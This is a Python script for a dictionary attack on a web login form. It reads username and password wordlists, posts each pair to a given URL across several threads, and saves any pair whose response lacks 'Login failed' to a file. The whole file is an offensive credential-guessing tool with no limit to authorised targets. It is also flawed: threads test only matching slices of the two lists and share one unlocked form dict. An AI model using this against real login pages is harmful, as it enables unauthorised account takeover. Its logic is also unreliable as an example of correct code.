import requests
import threading
import argparse

# Parse command line arguments
parser = argparse.ArgumentParser(description="Test login credentials using a dictionary attack.")
parser.add_argument("url", help="The URL to test.")
parser.add_argument("username_file", help="The path to the file containing the usernames to test.")
parser.add_argument("password_file", help="The path to the file containing the passwords to test.")
parser.add_argument("-t", "--threads", type=int, default=4, help="The number of threads to use.")
args = parser.parse_args()

# Set the URL and form data
url = args.url
data = {
    "username": "admin",
    "password": "",
    "submit": "Login"
}

# Open the username file and read in the usernames
with open(args.username_file, "r") as f:
    usernames = [line.strip() for line in f.readlines()]

# Open the password file and read in the passwords
with open(args.password_file, "r") as f:
    passwords = [line.strip() for line in f.readlines()]

# Define a function to try a subset of the username and password lists
def try_credentials(username_list, password_list, lock):
    for username in username_list:
        for password in password_list:
            data["username"] = username
            data["password"] = password
            response = requests.post(url, data=data)
            if "Login failed" not in response.text:
                print("Login succeeded with username:", username, "and password:", password)
                with lock:
                    # Write the successful username and password to a file
                    with open("successful_logins.txt", "a") as f:
                        f.write(username + ":" + password + "\n")
                return

# Split the username and password lists into subsets
num_threads = args.threads
username_lists = [usernames[i::num_threads] for i in range(num_threads)]
password_lists = [passwords[i::num_threads] for i in range(num_threads)]

# Create a thread for each subset of the username and password lists
threads = []
lock = threading.Lock()
for i in range(num_threads):
    t = threading.Thread(target=try_credentials, args=(username_lists[i], password_lists[i], lock))
    threads.append(t)

# Start each thread
for t in threads:
    t.start()

# Wait for each thread to finish
for t in threads:
    t.join()
